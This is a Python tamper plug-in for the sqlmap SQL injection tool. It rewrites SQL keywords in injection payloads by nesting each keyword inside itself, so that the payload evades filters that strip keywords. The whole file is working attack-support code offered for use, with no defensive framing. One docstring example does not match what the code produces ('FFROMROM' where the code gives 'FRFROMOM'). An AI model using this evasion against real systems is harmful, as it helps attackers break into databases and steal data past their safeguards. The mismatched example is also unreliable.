#!/usr/bin/env python

"""
Tamper script for sqlmap that inserts each found SQL keyword inside itself.

Example:
    SELECT  ->  SESELECTLECT
    UNION   ->  UNUNIONION
    WHERE   ->  WHWHEREERE
"""

from lib.core.enums import PRIORITY
import re

__priority__ = PRIORITY.NORMAL

# SQL Keywords to obfuscate
SQL_KEYWORDS = {
    "SELECT",
    "UNION",
    "ORDER",
    "FROM",
    "WHERE",
    "AND",
    "OR",
    "INSERT",
    "UPDATE",
    "DELETE",
    "DROP",
    "TABLE",
    "INTO",
    "VALUES",
    "SET",
    "INNER",
    "JOIN",
    "LEFT",
    "RIGHT",
    "OUTER",
    "GROUP",
    "HAVING",
    "DISTINCT",
    "LIMIT",
    "OFFSET",
    "CASE",
    "WHEN",
    "THEN",
    "ELSE",
    "END",
    "AS",
    "LIKE",
    "IS",
    "NULL",
    "NOT",
    "EXISTS",
    "IN",
    "ON",
    "EXEC",
}


def dependencies():
    pass


def obfuscate_keyword(match):
    """Injects the keyword inside itself to evade keyword stripping."""
    keyword = match.group(0)  # Extract matched keyword
    return keyword[: len(keyword) // 2] + keyword + keyword[len(keyword) // 2 :]


def tamper(payload, **kwargs):
    """
    Inserts each found SQL keyword inside itself.

    Example:
        'SELECT username FROM users'  →  'SESELECTLECT username FFROMROM users'
    """
    if not payload:
        return payload

    # Regex to match full SQL keywords
    pattern = re.compile(r"\b(" + "|".join(SQL_KEYWORDS) + r")\b", re.IGNORECASE)
    tampered_payload = pattern.sub(obfuscate_keyword, payload)

    return tampered_payload
